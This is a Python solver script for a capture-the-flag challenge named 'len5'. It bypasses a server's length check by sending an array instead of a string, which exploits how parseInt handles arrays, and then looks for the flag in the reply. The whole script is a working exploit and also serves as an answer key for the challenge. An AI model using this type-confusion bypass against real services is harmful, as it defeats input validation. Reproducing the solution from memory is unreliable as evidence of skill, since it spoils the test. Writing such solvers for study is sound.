#!/usr/bin/env python3
"""Solver for len5.

The server only checks `num.length === 5` before doing
`parseInt(num, 10)`. Passing an array such as [767879, 0, 0, 0, 0]
satisfies the length check (array length 5) while `parseInt` stringifies
the array to "767879,0,0,0,0" and parses the leading number 767879,
which is exactly the value the server compares against.
"""
import os

import requests

if "SERVICE_APP_HTTP_ENDPOINT" in os.environ:
    endpoint = os.environ["SERVICE_APP_HTTP_ENDPOINT"]
elif "SERVICE_APP_HTTP_HOST" in os.environ:
    host = os.environ["SERVICE_APP_HTTP_HOST"]
    port = os.environ["SERVICE_APP_HTTP_PORT"]
    endpoint = f"http://{host}:{port}"
else:
    endpoint = "http://localhost:1312"
endpoint = endpoint.rstrip("/")

payload = {"num": [767879, 0, 0, 0, 0]}

resp = requests.post(endpoint + "/", json=payload, timeout=10)
resp.raise_for_status()

print(resp.text)

if "Congratulations" not in resp.text:
    print("Did not receive the flag")
    raise SystemExit(1)
